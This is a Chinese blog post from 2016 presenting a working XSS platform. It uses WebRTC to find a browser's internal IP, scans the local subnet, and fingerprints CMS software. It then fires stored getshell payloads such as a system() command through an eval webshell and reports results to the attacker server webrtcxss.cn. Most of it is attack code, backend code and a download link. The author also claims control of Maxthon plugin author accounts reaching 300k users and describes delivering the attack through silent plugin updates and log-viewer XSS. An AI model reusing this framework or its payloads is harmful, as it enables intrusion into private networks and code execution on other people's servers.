---
title: XSS 自动化入侵内网
description: 利用 webrtc 的特性对内网进行检测、入侵
date: 2016-12-14T22:40:25+08:00
tags:
  - web security
  - xss
translationKey: use-xss-automation-invade-intranet
aliases:
  - /zh/p/use-xss-automation-invade-intranet/
  - /zh/posts/xss自动化入侵内网/
---

## 0x01 前言: {#intro}

很多人都认为 XSS 只能做盗取 cookies 的活。以至于有些 SRC、厂商对待反射型 XSS 视而不见，或者说是根本不重视。

直到“黑哥”在之前的演讲中提到 XSS 入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的 XSS 内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像 0x_Jin 之前在乌云报道的搜狐漏洞那样: <http://www.wooyun.org/bugs/wooyun-2014-076685>

这里有几个需要注意的地方: 由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的 0day，那事情就另当别论了。

而 0x_Jin 在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的 80 端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin 没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。

## 0x02 构架: {#architecture}

代码采用了类似 XSS 平台那种实时反馈机制。在这里我先把变量介绍一遍:

```js
var onlyString           = "abc";
var ipList               = [];
var survivalIpLIst       = [];
var deathIpLIst          = [];
var sendsurvivalIp       = "http://webrtcxss.cn/Api/survivalIp";
var snedIteratesIpUrl    = "http://webrtcxss.cn/Api/survivalPortIp";
var snedIteratesCmsIpUrl = "http://webrtcxss.cn/Api/survivalCmsIp";
var sendExistenceVul     = "http://webrtcxss.cn/Api/existenceVul";
```

1. onlyString : 唯一字符串，用于让服务器识别当前发送的请求是哪一个项目，真实代码是不会写成 abc 的，会使用 md5(date('Y-m-d H: i: s')) 来生成 hash。

2. ipList : 数组变量用来储存 webrtc 获取的内网 IP 地址。

3. survivalIpLIst : 数组对象用于存放开放 80 端口的 IP 地址

4. deathIpLIst : 数组对象用于存放不存在 80 端口的 IP，用于判断

5. sendsurvivalIp : 发送当前内网 IP 的信息到服务端

6. snedIteratesIpUrl : 从服务端反馈的 cms 路径对当前存在 80 端口的 IP 进行判断，看现有存活的 IP 地址是否可以在服务端里找到所匹配的 CMS 信息
7. snedIteratesCmsIpUrl : 用于在已匹配到的 cms 信息里，从服务端里验证这个 cms 是否存在我们在服务端里所保存的 getshell 漏洞
8. sendExistenceVul : 已确定漏洞，发送到服务端

之前在 0x01 前言里说到，这里我将会使用其他办法“绕过浏览器的同源策略”。整段代码的构架: https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec

## 0x03 获取内网的 IP 信息: {#get-ip}

详情请移步到: https://webrtc.org/faq/#what-is-webrtc
因为 WebRTC 让 JavaScript 具有了一定的底层操作方法，而由于 WebRTC 的特殊性，让我们可以使用 JavaScript 来获取到内网 IP。目前 WebRTC 支持的平台有: Chrome、Firefox、Opera、Android、IOS。实际测试的时候 maxthon 也是支持的（此处有伏笔）。
WebRTC 获取内网 IP 这段代码网上是可以找到的，而在这里需要修改一下。方便其他代码容易调用。
然后就是 webrtc 的代码了:

```js
var webrtcxss = {
    webrtc : function(callback){
        var ip_dups           = {};
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var mediaConstraints  = {
            optional: [{RtpDataChannels: true}]
        };
        var servers = undefined;
        if(window.webkitRTCPeerConnection){
            servers = {iceServers: []};
        }
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        pc.onicecandidate = function(ice){
            if(ice.candidate){
                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1];
                if(ip_dups[ip_addr] === undefined)
                callback(ip_addr);
                ip_dups[ip_addr] = true;
            }
        };
        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){});
        });
    },
    getIp : function(){
        this.webrtc(function(ip){
            ipList.push(ip);
        });
    }
}
webrtcxss.getIp();
```

现在我们来打印一下看看:

![](/images/use-xss-automation-invade-intranet/webrtc-local-ip.png)

已经获取到了我当前主机的 IP 地址了。

## 0x04 检测内网中开启了 80 端口的 IP: {#port-scan}

上一节的结尾可以看到 `webrtcxss.getIp()`;已经调用了 WebRTC 来获取到内网的 IP 信息，IP 保存在 ipList 数组变量里。这里就要检测内网中所有开放 80 端口的 IP 了。这里我写了一个函数来把这一步放到函数里:

```js
function iteratesIp(){
    stage(1)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendsurvivalIp, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('survivalip='+ ipList.join("-") + '&onlystring=' + onlyString);
    for(var i = 0;i < ipList.length;i++){
        incompleteIp = ipList[i].split(".");
        incompleteIp.pop();
        incompleteIp = incompleteIp.join(".");
        for(var j = 1;j < 255;j++){
            var ip = incompleteIp + "." + j;
            var imgTag = document.createElement("img");
            imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
            imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
            imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
            imgTag.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(imgTag);
        }
    }
}
setTimeout("iteratesIp()",20000);
(function(){
    if(deathIpLIst.length + survivalIpLIst.length == 254){
        snedIteratesIpData(survivalIpLIst);
    }else{
        setTimeout(arguments.callee,5000);
    }
})();
```

至于其中的 `stage(1)` 是我自己写的一个函数，用于实时向服务端发送当前最新的运行情况，我们放到最后再说。

```js
ipAjax = new XMLHttpRequest();
ipAjax.open('POST', sendsurvivalIp, false);
ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
ipAjax.send('survivalip='+ ipList.join("-") + '&onlystring=' + onlyString);
```

这段代码是把当前获取到的内网 IP 发送到服务端，至于为什么要在 ipList 后面加上 join("-") 函数是因为 WebRTC 有时会把获取网关、VM 虚拟机的 IP 也获取上来。

```js
for(var i = 0;i < ipList.length;i++){
    incompleteIp = ipList[i].split(".");
    incompleteIp.pop();
    incompleteIp = incompleteIp.join(".");
    for(var j = 1;j < 255;j++){
        var ip = incompleteIp + "." + j;
        var imgTag = document.createElement("img");
        imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
        imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
        imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
        imgTag.setAttribute("style","display:none;");
        document.getElementsByTagName("body")[0].appendChild(imgTag);
    }
}
```

这段代码是遍历所有内网主机 80 端口的。我们来实际看下把:

![](/images/use-xss-automation-invade-intranet/subnet-prefix.png)

后面的。104 被我们去掉了。然后利用 for 循环来遍历 192.168.1.1~192.168.1.254
现在我们来运行

```js
for(var i = 0;i < ipList.length;i++){
    incompleteIp = ipList[i].split(".");
    incompleteIp.pop();
    incompleteIp = incompleteIp.join(".");
    for(var j = 1;j < 255;j++){
        var ip = incompleteIp + "." + j;
        var imgTag = document.createElement("img");
        imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
        imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
        imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
        imgTag.setAttribute("style","display:none;");
        document.getElementsByTagName("body")[0].appendChild(imgTag);
    }
}
```

这段代码:

![](/images/use-xss-automation-invade-intranet/favicon-scan-console.png)

这是控制台的效果，我们来看下 DOM 发生了哪些变化把:

![](/images/use-xss-automation-invade-intranet/favicon-img-tags-dom.png)

这里我使用的是 `http://192.168.1.xxx/favicon.ico` 来判断内网哪些 IP 开启了 80 端口，并且上面运行着站点。
其中的 `onerror="javascript:deathIpLIst.push('192.168.1.xxx')"` 是如果此 IP 没有开启 80 端口，或者开启了 80 端口，但是没有运行站点的话，就调用把当前的 IP 地址 push 到 deathIpLIst 变量里。如果存在的话就 push 到 survivalIpLIst 变量里，也就是这段代码: `onload="javascript:survivalIpLIst.push('192.168.1.1')"`
至于为什么要这么做呢，这里就要涉及一个坑了。浏览器是不会你加载了哪些图片就立刻告诉你哪些图片是可以访问，哪些图片是不能访问的，浏览器需要一个缓冲的时间。检测同一网段里 254 个主机是否存在 favicon.ico，大约需要花费 550000ms===550s 约等于 2.16535s/IP。也就是 9.16 多分钟。也就是全部检测完需要等待 9.16 分钟。这也是没办法的事，改变不了。
至于下面为什么要使用 `setTimeout("iteratesIp()",20000);` 来延迟 20 秒执行呢，因为 WebRTC 获取 IP 需要一定的时间，其实几秒钟就好了。但是为了提高容错率我把时间提高到 20 秒的时间，如果你嫌慢，可以在文章结尾下载源代码，修改。
还有一段代码是这样的:

```js
(function(){
    if(deathIpLIst.length + survivalIpLIst.length == 254){
        snedIteratesIpData(survivalIpLIst);
    }else{
        setTimeout(arguments.callee,5000);
    }
})();
```

这就是为什么我之前要把 80 端口不存在的 IP 放到一个数组变量里，存在 80 端口的 IP 放到一个数组变量里。因为我不确定他们什么时候好，之前说的 9.1 分钟，只是一个大概时间，因电脑配置、内网通讯速度等其他的原因可能会提前，也可能会更慢。我无法做出保证。所以写了一段代码。下面我来说说这段代码的意思:

```js
(function(){
    /*coding*/
})();
```

是一段匿名函数，当代码运行到此处时会立刻执行此函数。
函数里面首先是判断 deathIpLIst.length + survivalIpLIst.length 是否等于 254。如果等于 254 则调用 snedIteratesIpData 函数，并把开启 80 端口并运行站点的 IP 作为参数发送过去。如果不等于说明浏览器还没有把所有的图片都给判断好。进入 else 分之。
`setTimeout(arguments.callee,5000);` 是延迟 5 秒钟运行 arguments.callee。而 arguments.callee 的意思是当前函数。我们来实际看下:

![](/images/use-xss-automation-invade-intranet/arguments-callee-log.png)

console.log 打印了当前的函数，当然你也可以使用 setTimeout(当前的函数名 ()，5000);来达到此效果，但是此方法对于匿名函数没有用。因为匿名函数是不存在名称的。如果学了递归的朋友们，应该会很好理解。
说通俗点就是: 每隔 5 秒钟运行此函数，直到所有 img 标签全部判断完成，才进行下一步的操作。

## 0x05 确认内网存活主机的 CMS 信息: {#detect-cms}

上一节我们说到闭包里的 if 条件里 true 执行的 snedIteratesIpData 函数，现在我们就来说说这个函数里面是什么内容:

```js
function snedIteratesIpData(ip){
    if(deathIpLIst.length == 254){
        return false;
    }
    stage(2)
    ip = ip.join("-")
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var cmsPath = JSON.parse(ipAjax.responseText).path;
            for(var key in cmsPath){
                for(var i = 0;i < survivalIpLIst.length;i++){
                    var scriptTag = document.createElement("script");
                    scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                    scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                    scriptTag.setAttribute("data-cmsinfo",key);
                    scriptTag.setAttribute("onload","javascript:vulnerabilityIpList(this)");
                    document.getElementsByTagName("body")[0].appendChild(scriptTag);
                }
            }
        }
    }
    ipAjax.open('POST', snedIteratesIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('iplist='+ip+'&onlystring='+onlyString);
}
```

为什么要在函数开始前写上 if 函数呢，因为在上一节中的闭包里存在一个 bug。就是当所有内网 IP 中都没有开放 80 端口且不存在站点的情况下，deathIpLIst.length 会为 254。而 survivalIpLIst.length 会为 0。那 `deathIpLIst.length + survivalIpLIst.length == 254` 的条件是为 true 的。为了避免此 bug 的发生，我们在 snedIteratesIpData 函数里加入

```js
if(deathIpLIst.length == 254){
    return false;
}
```

当 deathIpLIst.length 等于 254 的时候，返回 false。不再向下执行。因为所有代码的构架就是 A 调用 B，C 调用 A，D 调用 C。当 C 返回 false 的时候，D 是不会执行的。从上面的代码可以看到，返回 false 后。下面的代码都不会运行的。
现在我们来看下 `ip = ip.join("-")` 这条代码的意思，是当内网中存在两条（包括两条）以上的 IP 地址时，使用 join 函数，传给服务端。方便服务端的接受及查看。服务端的反馈就像下面这样:

![](/images/use-xss-automation-invade-intranet/vuln-detail-open-ports.png)

面来说说 ajax 请求的代码:

```js
ipAjax = new XMLHttpRequest();
ipAjax.onreadystatechange = function(){
    if(ipAjax.readyState == 4 && ipAjax.status == 200){
        var cmsPath = JSON.parse(ipAjax.responseText).path;
        for(var key in cmsPath){
            for(var i = 0;i < survivalIpLIst.length;i++){
                var scriptTag = document.createElement("script");
                scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                scriptTag.setAttribute("data-cmsinfo",key);
                scriptTag.setAttribute("onload","javascript:vulnerabilityIpList(this)");
                document.getElementsByTagName("body")[0].appendChild(scriptTag);
            }
        }
    }
}
ipAjax.open('POST', snedIteratesIpUrl, false);
ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
ipAjax.send('iplist='+ip+'&onlystring='+onlyString);
```

发送内网中开放 80 端口且具有站点的 ip 地址，并同时发送唯一标识符。用于服务端验证。
服务端接受后，发送 json 数据，服务端代码如下:

```php
$this->ajaxReturn(array(
    "typeMsg" => "success",
    "path"    => $pathInfo,
));
```

然后使用 if(ipAjax.readyState == 4 && ipAjax.status == 200) 来判断是否发送成功，成功后，把 json 里的 path 数据赋值 cmsPath 变量。用于后面的代码调用。首先进入 for 循环，cmsPath['key']为当前的 cms 路径。然后再来套一个 for 循环，survivalIpLIst[i]为当前循环的 IP 地址。
接下来就是建立一个 script 标签的 DOM 元素，其中的 data-ipadder、data-cmsinfo 是为了让后面的代码方便调用。`onload = " javascript:vulnerabilityIpList(this)"` 是当这个地址存在的时候，调用的一个函数，下一节会说到。
现在先让我们看看数据库在的 cmsPath 是什么样的把:

![](/images/use-xss-automation-invade-intranet/cmspath-db-table.png)

默认就这 4 个，更多的路径可以自行加入。
为了方便测试，我在我家中的另一台电脑上部署了代码，只有 index.php、/static/bbcode.js、vul/heihei.php、favicon.ico 这几个文件。而在 heihei.php 文件里代码如下:

```php
<?php
   eval($_GET['a']);
```

为什么是这个呢，很简单。我手里面没有 Discuz 的 getshell 漏洞。为了徒省事。就这样把。而 favicon.ico 文件我也很随意的使用了 dedecms 的 favicon.ico。后面测试的时候，还望不要见怪。
现在我们来运行下代码看下会发生什么事情吧:

![](/images/use-xss-automation-invade-intranet/cms-js-probe-console.png)

我在/static/bbcode.js 文件里写入的是 console.log(1) 所有会在控制台反馈 1。这只是测试的代码，真实的环境是不会这样的。现在我们来看下 DOM 元素有些改变把:

![](/images/use-xss-automation-invade-intranet/cms-script-tags-dom.png)

已经调用了，程序检测到只有 http://192.168.1.103/static/js/bbcode.js 符合。那么一旦成功调用 js 文件，就会执行 onlod 里的 vulnerabilityIpList(this) 代码。而 vulnerabilityIpList 函数代码就在下一节。

## 0x06 检测内网主机中的漏洞是否真实存在（上篇）: {#verify-vuln-part-1}

下面就是 vulnerabilityIpList 函数的代码:

```js
function vulnerabilityIpList(info){
    stage(3)
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var vulCmsInfo = ipAjax.responseText;
            var img = document.createElement("img");
            img.setAttribute("scr",vulCmsInfo);
            img.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(img);
            setTimeout(function(){
                var scriptTag = document.createElement("script");
                scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");
                scriptTag.setAttribute("data-cmsinfo",info.getAttribute("data-cmsinfo"));
                scriptTag.setAttribute("data-vulip",info.getAttribute('data-ipadder'));
                scriptTag.setAttribute("onload","javascript:vulConfirm(this)");
                document.getElementsByTagName("body")[0].appendChild(scriptTag);
            },2000);
        }
    }
    ipAjax.open('POST', snedIteratesCmsIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('existenceCmsIp='+ info.getAttribute("data-ipadder") + '&existenceCmsInfo=' + info.getAttribute("data-cmsinfo") + '&onlystring=' + onlyString);
}
```

其中 info 参数是成功调用的 script 标签的 DOM 元素对象。
首先让我们看下发送 url 的请求:

1. existenceCmsIp 参数是检测到 cms 类型的 IP 地址

2. existenceCmsInfo 参数是检测到 cms 类型

3. onlystring 参数是唯一标识符，用于服务器判断属于哪一个项目。

接下来让我们看下 onreadystatechange 里面的内容:

```js
var vulCmsInfo = ipAjax.responseText;
var img = document.createElement("img");
img.setAttribute("scr",vulCmsInfo);
img.setAttribute("style","display:none;");
document.getElementsByTagName("body")[0].appendChild(img);
setTimeout(function(){
    var scriptTag = document.createElement("script");
    scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");
    scriptTag.setAttribute("data-cmsinfo",info.getAttribute("data-cmsinfo"));
    scriptTag.setAttribute("data-vulip",info.getAttribute('data-ipadder'));
    scriptTag.setAttribute("onload","javascript:vulConfirm(this)");
    document.getElementsByTagName("body")[0].appendChild(scriptTag);
},2000);
```

首先就是 var vulCmsInfo = ipAjax.responseText;，把服务器返回的字符串赋值给 vulCmsInfo 变量。服务端的代码是:

```php
/*
* 把客户端检测到存在 CMS 的 IP 加入到数据库中
*/
if(I('post.existenceCmsIp')  == "" || I('post.existenceCmsInfo') == "" || I('post.onlystring') == ""){
    $this->ajaxReturn(array(
        "typeMsg" => "error",
    ));
}
$existenceCmsIp               = I('post.existenceCmsIp');
$existenceCmsInfo             = I('post.existenceCmsInfo');
$onlyString                   = I('post.onlystring');
$existencecmsip               = M('existencecmsip');
$existenceData['inner_ip']    = $existenceCmsIp;
$existenceData['cms']         = $existenceCmsInfo;
$existenceData['onlystring'] = $onlyString;
$existenceData['create_time'] = date('Y-m-d H:i:s');
$existencecmsip->data($existenceData)->add();
/*
* 获取数据库中的 cms 漏洞详情，发送给客户端
*/
$cmsvul  = M('cmsvul');
$vulInfo = base64_decode($cmsvul->where('cms="'.$existenceCmsInfo.'"')->getField("vulinfo"));
echo "http://".$existenceCmsIp.$vulInfo;从代码中可以看到服务端返回的不是json数据，而是字符串，这个字符串是拼接好的url。这个url就是从获取到的IP地址加上服务器中调用属于cms漏洞的path路径。
```

然后使用 img 标签来发送 get 请求，用于触发此 getshell 漏洞。代码也就是:

```js
var img = document.createElement("img");
img.setAttribute("scr",vulCmsInfo);
img.setAttribute("style","display:none;");
document.getElementsByTagName("body")[0].appendChild(img);
```

至于为什么要使用 setTimeout 函数来延迟 2 秒钟执行，是因为之前也说过浏览器是无法同时判断那么多的 img 请求。因为这里只有一个所以我使用了 2 秒，真实情况下可以改为 20 秒。
然后建立一个 script 标签，用于判断 1.js 是否生成成功，如果生成成功，就说明漏洞存在，交给下一个函数处理，如果不存在，就此打住。因为 onload 不会调用 vulConfirm 函数。
至于为什么要判断 1.js 文件，就是我之前所说的 getshell 生成的代码。在数据中是这样的:

![](/images/use-xss-automation-invade-intranet/cmsvul-base64-table.png)

是一段 base64 密文，解开后，内容如下: `/vul/heihei.php?a=system('echo 1 >> ../1.js');`
而在后端发送给前端的时候，我已经解密了。如同上面代码中:
`$vulInfo = base64_decode($cmsvul->where('cms="'.$existenceCmsInfo.'"')->getField("vulinfo"));`
而在浏览器中代码是这样:

![](/images/use-xss-automation-invade-intranet/getshell-payload-dom.png)

接下来就是 setTimeout 函数的真正的用处了。请注意这段代码:
`scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");`
在 script 中把 src 的赋值成检测目标站点是否存在 1.js。如果存在就运行 onload 里的 vulConfirm 函数。而 vulConfirm 函数就在下一节。

## 0x07 检测内网主机中的漏洞是否真实存在（下篇）: {#verify-vuln-part-2}

vulConfirm 函数的内容很简单，只有给服务端发送的代码。

```js
function vulConfirm(cmsConfirmInfo){
    stage(4)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendExistenceVul, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('cms='+ cmsConfirmInfo.getAttribute("data-cmsinfo") + '&vulip='+ cmsConfirmInfo.getAttribute("data-vulip") +'&onlystring=' + onlyString);
}
```

1. cms 参数是存在漏洞的 CMS 信息
2. vulip 是存在漏洞的 IP 地址
3. onlystring 是唯一标识符，用于服务端判断

## 0x08 stage 的作用: {#stage}

stage 函数代码如下:

```js
function stage(num){
    var updataStage = document.createElement("img");
    updataStage.setAttribute("src","http://webrtcxss.cn/Api/stage/onlystring/"+onlyString+"/updata/"+num);
    updataStage.setAttribute("style","display:none;");
    document.getElementsByTagName("body")[0].appendChild(updataStage);
}
```

就是一个 img 标签，发送 get 请求到服务端，告诉服务端代码运行到哪里了。在平台中的反馈如图:

![](/images/use-xss-automation-invade-intranet/stage-feedback-list.png)

## 0x09 API 后端代码: {#api-backend}

后端使用了 thinkphp 框架。如果你想修改服务端接受的方式的话。
请在/Application/Home/Controller 目录下修改 ApiController.class.php 文件，就行了。里面的内容分为 survivalIp、survivalPortIp、_empty、survivalCmsIp、existenceVul、stage 模块。可根据 JavaScript 中的代码来做出相应的修改。如图:

![](/images/use-xss-automation-invade-intranet/api-controller-code.png)

## 0x10 平台专属的 API: {#platform-api}

平台的 api 在 `/Application/Home/Controller` 目录下的 RootApiController.class.php 文件里。
建立项目、删除项目、查询项目都在里面。如果你想修改 JavaScript 代码，就在建立项目中修改，如图:

![](/images/use-xss-automation-invade-intranet/add-project-code.png)

修改起来很简单。
平台运行起来如下图:

![](/images/use-xss-automation-invade-intranet/project-list.png)

![](/images/use-xss-automation-invade-intranet/add-project-modal.png)

![](/images/use-xss-automation-invade-intranet/project-success-script.png)

![](/images/use-xss-automation-invade-intranet/vuln-detail-modal.png)

![](/images/use-xss-automation-invade-intranet/no-projects-page.png)

## 0x11 数据库的结构: {#database}

一共具有 7 个表，如下:

1. `webrtc_cmspath` 用于存放检测 cms 类型的 JavaScript 路径
2. `webrtc_cmsvul用于存放cms` 的 getshell 漏洞详情
3. `webrtc_existencecmsip` 用于存放内网中哪些 IP 具有 cms
4. `webrtc_existencevul` 用于存放内网中哪些 IP 具有的 CMS 有漏洞
5. `webrtc_ipdatalist` 用于存放内网中所有开放 80 端口切具有站点的 ip 列表
6. `webrtc_project` 用于存放项目信息
7. `webrtc_survivaliplist` 用于存放当前主机的内网 ip

## 0x12 特殊的玩法: {#attack-vectors}

之前在 freebuf 说过了，地址是: <http://www.freebuf.com/articles/web/61268.html>
因为 nginx 或者 apache 有些管理员会使用日志看实时查看网站的流量，由于 log 日志看起来太丑，于是就有人想出 web 端实时的反馈网站流量。但是在记录 user-agent 等数据包格式的时候，没有做好过滤。从而导致攻击者修改自己的 user-agent 为 XSS 攻击字符串，再进行浏览网站的操作，网站管理员在查看的时候就会触发 XSS，如果配合本章所讲的内容。就像下雨天吃着巧克力一样完美。其实并不一定非要是 nginx 或者 apache，有些网站的后台写的程序中会使用后端语言而非 nginx 这种配置生成文件，他们会直接记录下你们的 IP、user-agent。从而在后台方便查看。这个时候我们本章所说的内容就会排上用场。
关于插件安全的话，请大家看下面这张图:

![](/images/use-xss-automation-invade-intranet/maxthon-plugins-dashboard.png)

我控制了十多个 maxthon 插件作者的账户，现在具有 30w 的插件用户，而我可以随时随地的更改其中的代码，而我问了一下 maxthon 插件的官方人员，答复是:

![](/images/use-xss-automation-invade-intranet/plugin-autoupdate-reply.png)

即使你没有相关的插件作者用户。可以使用组简单的 html+swf 来写一个插件小游戏，一个星期就可以上千。这里我打个比方，10w 用户都安装了我的插件。
其中 5w 是已经工作的用户。2w 是在公司电脑上使用 maxthon 并安装了插件，一旦打开 maxthon 浏览器，插件就会自动运行。而当插件发现有新版本时，会自动静默安装。然后就会运行我们的 JavaScript 代码，而我在 0x03 节的地方说到 maxthon 也是支持 WebRTC 的，但是这里会有坑。我不清楚是不是由版本引起的问题，在 chrome 下运行 WebRTC 代码时会显示一组 IP，也是当前电脑的内网 IP，而在 maxthon 下，会出现三组，可能不止三组。如图:

![](/images/use-xss-automation-invade-intranet/maxthon-multiple-ips.png)

其中 192.168.27.1 是我电脑上的 VM 虚拟机的 IP 段。192.168.118.1 也是 VM 虚拟机上的 ip 段。只有 192.168.1.104 才是当前真正的内网 IP。所以在源程序里会出现 join 函数和对 ipList 变量的 for 循环。

## 0x13 失败的思路: {#failed-ideas}

**思路一、**

假设这里获取到的内网 IP 为 192.168.21.104。根据 for 循环输出 img、script 标签可以获取到内网的所以存活 IP 地址（也可以探测 port），但是这里有一个问题，就是 JavaScript 里怎么获取到其他内网的资源信息，因为跨域，ajax、iframe 都不行。我昨天晚上问了 0xJin，他是没有获取，只是扫的存活 IP 及端口。但是说好是内网漫游，不能只获取到当前触发 XSS 的 Pc。昨天晚上查了一夜的资料，有个思路，但是不知道能不能实现。这里说明一下，如果有什么好的建议可以提出来。当然思路可能错误。

前面的跳过，假设现在已经有了内网中开放 80 端口的 IP。
既然 ajax、iframe 都不行，那我们可以尝试一下 flash 来获取，但是 flash 也有相应的 crossdomain.xml 限制，但是今天上午查资料的时候找到了这么一篇文章: <http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data>
根据作者所说，这个方法只能获取到视觉对象（图片、swf），也就是说无法获取存活 IP 里的 html 源码了。

我想是否可以使用 flash 发送一个带有 XSS 的 URL（内网 IP）
XSS 里调用 Html2canvas 插件来把存活 IP 中的网站截图发送给我们的服务器端。
当然了，这里有一个限制条件，就是必须获取存活 IP 中网站的 cms 信息（可以使用 `<img src="内网IP/favicon.ico">` 再把图片发送给远程服务器，来接受。这样就可以判断属于哪个 cms 类型的了，构架代码的时候可以加一个定时获取远程服务器的 JavaScript 代码，这样我们看到是 cms 类型后，就可以在网上找相应的爆版本信息的方法，写成代码，等待客服端的定时任务获取到）。

现在信息有了，还有一个条件，就是 XSS 漏洞，需要 XSS 漏洞来加载 Html2canvas 插件，并且保存成图片发送给远程的服务器。

问题来了，反射 XSS 并不是正真的打开网站，而是发送 get 请求。那 canvas 并不会加载，也就说图片获取失败。储蓄型的话可能成功。

失败的原因:

1. canvas 无法获取到 iframe 里的 DOM 内容

2. img 无法发送到远程服务器，因为调用 img 图片的时候，当前页面和 img 的图片不是同源的，无法发送

3. 隐蔽性很差

**思路二、**

之前我提到的思路是使用 xss+iframe+canvas，但是@超威蓝猫 说到 canvas 无法截取到 iframe 里的内容，后来我上网查后，确实如此（基础不牢的结果）。后来我又有了一个新的思路，使用 `<img src="https://xxx.xxx.xxx.xxx/favico.ico" />` 来获取网站的 cms 信息，因为不同的 cms 他们的 ico 图标也是不一样的，把 img 发送到服务器端后，就可以识别网站属于哪种 cms 类型了。但是后来和伟哥 @呆子不开口 讨论了几个小时，发现忽略了一个重要的问题，怎么把 img 发送到远程服务器，img 图片地址不是同源的，而且怎么把图片使用 JavaScript 转成二进制数据。这个思路又断了。伟哥提到一个很 nice 的解决方案，检测 js 脚本，也就是 `<script src="http://xxx.xxx.xxx.xxx/path/cms.js" onload="xxx(this)"></script>` 这样的话，我就需要大量 cms 独立的 js 文件位置。工作量大。我本来都打算使用这个了，但是前几天闲的无聊翻自己的 QQ 日志时，发现了一段代码:

```js
document.addEventListener("visibilitychange", function() {
    document.title = document.hidden ? 'iloveyou' : 'metoo';
});
```

这是 HTML5 推出的 API，我发现我可以利用这个 API 来达到神不知鬼不觉的上传图片。首先当用户切换到其他浏览器标签的时候，document.hidden 会为 true。那么我们就可以确定用户没有访问我们 XSS 的网页。那么我们干什么用户都不会发现了。大致的思路如下:

```js
document.addEventListener("visibilitychange", function() {
    if(document.hidden){
        var htmlText = $("body").html();
        $("body").empty();
        $("body").append("<img src='http://xxx.xxx.xxx.xxx/favico.ico' />");
        //canvas 获取页面，请移步: http://leobluewing.iteye.com/blog/2020145
    }else{
        $("body").empty();
        $("body").append(htmlText);
    }
});
```

失败的原因:

2. 因为之前提到过 img 加载太消耗时间，尤其在 maxthon 浏览器下，三组以上的 IP 地址全部检测完成需要 30 分钟左右。如果用此方法的话，需要确保用户在半个小时内不能打开此页面

3. canvas 无法获得不是本源的图片，也就是说不能获取到 img 加载的图片

总结后，就采用了伟哥的方法。

## 0x14 结尾: {#conclusion}

在此尤其感谢，@呆子不开口。这篇文章写的很累，因为 img 标签发送的耗时长的问题，导致每一次修改 BUG 的时候，都需要等 9-10 分钟。也是我目前为止写的时间最长的一篇文章。因为要学驾照，时间更少了。大概花了一个月左右的时间。之前和主编约稿的日期是 15 日，一直拖到现在，挺对不住的。前端、后端、数据库还有些的 BUG 没有修复，如果此平台的安装量达到 1000 会继续更新，下面是平台下载的 url:
<https://github.com/BlackHole1/WebRtcXSS>
